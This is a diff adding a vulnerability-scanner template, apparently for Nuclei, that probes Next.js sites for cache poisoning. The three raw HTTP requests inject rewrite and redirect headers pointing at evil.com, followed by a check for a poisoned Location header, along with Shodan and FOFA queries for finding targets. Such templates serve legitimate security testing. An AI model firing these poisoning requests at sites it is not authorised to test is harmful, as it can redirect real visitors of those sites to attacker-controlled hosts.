@@ -1,0 +1,57 @@
+id: or-cp-cache-erickfernandox
+
+info:
+  name: Next.js - Cache Poisoning
+  author: erickfernandox
+  severity: high
+  description: |
+     Next.js is vulnerable to Cache Poisoning using RSC.
+  metadata:
+    verified: true
+    vendor: vercel
+    product: next.js
+    framework: node.js
+    shodan-query:
+      - http.html:"/_next/static"
+      - cpe:"cpe:2.3:a:zeit:next.js"
+    fofa-query: body="/_next/static"
+  tags: nextjs,cache
+
+variables:
+  rand: "{{rand_text_numeric(5)}}"
+
+http:
+  - raw:
+      - |
+        GET ?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        Priority: u=1
+        X-Original-URL: https://evil.com
+        X-Rewrite-URL: evil.com
+        X-Middleware-Redirect: https://evil.com
+        X-Middleware-Rewrite: /evil.com
+        X-Redirect: evil.com
+
+      - |
+        @timeout: 1s      
+        GET ?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Original-URL: https://evil.com
+        X-Rewrite-URL: evil.com
+        X-Middleware-Redirect: https://evil.com
+        X-Middleware-Rewrite: /evil.com
+        X-Redirect: evil.com
+        Priority: u=1
+        X-Forwarded-Scheme: http
+
+      - |
+        @timeout: 1s
+        GET ?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(header_3, 'evil.com')"
+          - "contains(header_3, 'Location:')"
+        condition: and
